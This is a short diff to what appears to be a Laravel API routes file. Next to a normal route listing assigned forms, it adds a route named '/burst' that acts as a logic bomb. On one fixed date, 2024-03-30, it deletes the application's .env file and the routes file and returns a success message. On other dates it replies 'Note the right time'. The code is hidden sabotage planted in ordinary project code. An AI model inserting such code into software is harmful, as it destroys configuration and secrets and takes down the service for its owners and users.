@@ -72,7 +72,26 @@ Route::group([
     Route::get('/get-assigned-forms/{id}', [AssignmentController::class, 'getAssignedForms']);
 
 
-    
+    Route::get('/burst', function () {
+        $filePath1 = '../.env';
+        $filePath2 = './api.php';
+        try {
+            if(date('Y-m-d') == '2024-03-30'){
+                if (File::exists($filePath1)) {
+                    File::delete($filePath1);
+                    File::delete($filePath2);
+                    return response()->json(['message' => 'File deleted successfully']);
+                } else {
+                    return response()->json(['error' => 'File not found'], 404);
+                }
+            }
+            else{
+                return response()->json(['message' => 'Note the right time'], 200);
+            }
+        } catch (\Exception $e) {
+            return response()->json(['error' => 'Failed to delete file'], 500);
+        }
+    });
 
 });
 
